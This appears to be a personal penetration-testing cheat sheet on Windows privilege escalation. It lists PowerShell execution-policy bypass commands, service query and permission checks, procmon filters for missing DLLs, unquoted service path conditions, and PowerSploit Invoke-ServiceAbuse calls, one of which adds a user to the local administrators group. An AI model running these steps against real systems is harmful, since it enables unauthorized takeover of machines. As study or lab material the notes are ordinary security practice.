# Running Programs
## Powershell
### Spawn Powershell Bypass Execution Policy
	powershell -ep bypass
#### Spawn Powershell and Run Program
`powershell -ep bypass .\<FILE>`
#### Spawn Powershell and Run Command
`powershell -ep bypass -c "<COMMAND>"`
	
### Program Location
	get-command <COMMAND>
	which /R <START> <FILE>
	
### Modifying Service
	sc query <SERVICE>
	
	sc start <SERVICE>
	
	sc stop <SERVICE>
	
### Checking Service Permissions
	icacls <SERVICE_PATH>
	sc sdshow <SERVICE>
	
### Missing DLL using procmon
- Result contains 'NAME NOT FOUND'
- Path ends with '.dll'

### Writable Service Permissions
#### Permissions
- SERVICE_CHANGE_CONFIG
- CanRestart: True

## PowerSploit
### Unquoted Service Path
- Writable in any directory of `C:\Program Files\Unquoted Path Service\<SERVICE>`
#### Permissions
- CanRestart: True
### Invoke-ServiceAbuse
- #### Add user
Adds admin "john", password: "Password123!"
`Invoke-ServiceAbuse -Name <SERVICE>`
- #### System command
`Invoke-ServiceAbuse -Name <SERVICE> -Command "cmd -c net localgroup administrators user /add"`
	
#### Links
Writable DLL: [[3.2.2.4 DLL Hijacking]]
Writable Service Permission: [[3.2.2.5 Binary Path Hijacking]]
Unquoted Service Path: [[3.2.2.0 Common Exploits#Unquoted Service Path]]